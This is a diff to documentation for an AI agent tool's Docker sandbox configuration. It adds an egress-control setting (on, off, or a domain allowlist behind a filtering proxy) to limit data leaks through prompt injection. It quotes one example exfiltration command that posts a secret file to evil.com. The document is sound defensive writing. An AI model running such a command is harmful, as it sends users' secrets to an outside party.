@@ -226,6 +226,8 @@ terminal:
     - "--gpus=all"
     - "--network=host"
   docker_network: true             # false = air-gap the container (--network=none)
+  container_network: "on"          # Egress: "on" | "off" | "allowlist" (see below)
+  container_network_allowlist: []  # Domains reachable in "allowlist" mode
 
   # Resource limits
   container_cpu: 1                 # CPU cores (0 = unlimited)
@@ -247,7 +249,37 @@ terminal:
 
 **`terminal.docker_extra_args`** (also overridable via `TERMINAL_DOCKER_EXTRA_ARGS='["--gpus=all"]'`) lets you pass arbitrary `docker run` flags that Hermes doesn't surface as first-class keys — `--gpus`, `--network`, `--add-host`, alternative `--security-opt` overrides, etc. Each entry must be a string; the list is appended last to the assembled `docker run` invocation so it can override Hermes' defaults if needed. Use sparingly — flags that conflict with the sandbox hardening (capability drops, `--user`, the workspace bind mount) will silently weaken isolation.
 
-**`terminal.docker_network`** (default `true`; env: `TERMINAL_DOCKER_NETWORK`) — set to `false` to run the sandbox container with `--network=none`, cutting off all network egress from agent commands. This applies to the execution container used by `terminal`, `execute_code`, and the file tools. Because containers persist across Hermes processes, flipping this to `false` while an older networked container exists will remove that container and start a fresh air-gapped one (a warning is logged); background processes running inside it are lost. Prefer this key over passing `--network=none` through `docker_extra_args`.
+**`terminal.docker_network`** (default `true`; env: `TERMINAL_DOCKER_NETWORK`) — set to `false` to run the sandbox container with `--network=none`, cutting off all network egress from agent commands. This applies to the execution container used by `terminal`, `execute_code`, and the file tools. Because containers persist across Hermes processes, flipping this to `false` while an older networked container exists will remove that container and start a fresh air-gapped one (a warning is logged); background processes running inside it are lost. Prefer this key over passing `--network=none` through `docker_extra_args`. Superseded by `container_network` below — `false` remains a hard "off" and is never weakened by `container_network` defaults.
+
+#### Sandbox egress control (`container_network`)
+
+The approval gate blocks destructive commands and remote-code-execution patterns, but it does **not** block outbound data exfiltration (`curl -X POST evil.com -d @secret`) — network egress is the channel a prompt-injection would use to leak data. `terminal.container_network` (env: `TERMINAL_CONTAINER_NETWORK`) restricts it:
+
+- **`"on"`** (default) — full network, current behavior.
+- **`"off"`** — no network at all (`--network=none`).
+- **`"allowlist"`** — HTTP(S) only, routed through a domain-filtered proxy on an `--internal` Docker network. Requests to non-allowlisted domains get a 403 from the proxy; raw sockets and non-proxied egress have no route out at all.
+
+Any other value **fails closed to `"off"`** — a typo never grants full network.
+
+Like `docker_network`, this applies to the shared execution container used by `terminal`, `execute_code`, and the file tools. It does not cover the Codex app-server runtime, which executes in Codex's own sandbox; use Codex's network policy when this allowlist is a required boundary.
+
+**`terminal.container_network_allowlist`** (env: `TERMINAL_CONTAINER_NETWORK_ALLOWLIST`, JSON array) lists the domains reachable in `"allowlist"` mode. Entries are hostnames/domains only (no scheme or path); a bare domain also authorizes its subdomains, a leading `*.` wildcard matches subdomains but not the apex, and IP literals must match exactly. An empty list in `"allowlist"` mode means deny-all.
+
+```yaml
+terminal:
+  backend: docker
+  container_network: "allowlist"
+  container_network_allowlist:
+    - "pypi.org"
+    - "files.pythonhosted.org"
+    - "registry.npmjs.org"
+    - "github.com"
+    - "objects.githubusercontent.com"
+```
+
+**Container reuse interaction:** because containers persist across Hermes processes, changing the mode or the allowlist replaces the persisted container on the next startup — its network no longer matches the config, so it is removed and recreated (a warning is logged; in-container background processes are lost). Under `"on"`, a container stranded on a `hermes-egress-*` internal network is likewise replaced, while a deliberately air-gapped (`--network=none`) container is left alone.
+
+**Proxy lifecycle:** the filtering proxy and its internal network are labeled `hermes.egress`, keyed by a hash of the sorted allowlist (identical allowlists share one proxy; different allowlists get isolated networks), and pruned automatically when no sandbox uses them. Inspect manually with `docker ps -a --filter label=hermes.egress` and `docker network ls --filter label=hermes.egress`.
 
 **Requirements:** Docker Desktop or Docker Engine installed and running. Hermes probes `$PATH` plus common macOS install locations (`/usr/local/bin/docker`, `/opt/homebrew/bin/docker`, Docker Desktop app bundle). Podman is supported out of the box: set `HERMES_DOCKER_BINARY=podman` (or the full path) to force it when both are installed.
 
@@ -301,6 +333,8 @@ Every key under `terminal:` has an env-var override of the form `TERMINAL_<KEY_U
 | `TERMINAL_DOCKER_MOUNT_CWD_TO_WORKSPACE` | `docker_mount_cwd_to_workspace` | `true` / `false` |
 | `TERMINAL_DOCKER_RUN_AS_HOST_USER` | `docker_run_as_host_user` | `true` / `false` |
 | `TERMINAL_DOCKER_NETWORK` | `docker_network` | `true` / `false` — default `true`; `false` = `--network=none` |
+| `TERMINAL_CONTAINER_NETWORK` | `container_network` | `"on"` / `"off"` / `"allowlist"` — default `"on"`; unknown values fail closed to `"off"` |
+| `TERMINAL_CONTAINER_NETWORK_ALLOWLIST` | `container_network_allowlist` | JSON array: `'["pypi.org","github.com"]'` |
 | `TERMINAL_DOCKER_PERSIST_ACROSS_PROCESSES` | `docker_persist_across_processes` | `true` / `false` — default `true` |
 | `TERMINAL_DOCKER_ORPHAN_REAPER` | `docker_orphan_reaper` | `true` / `false` — default `true` |
 | `TERMINAL_CONTAINER_CPU` | `container_cpu` | CPU cores |
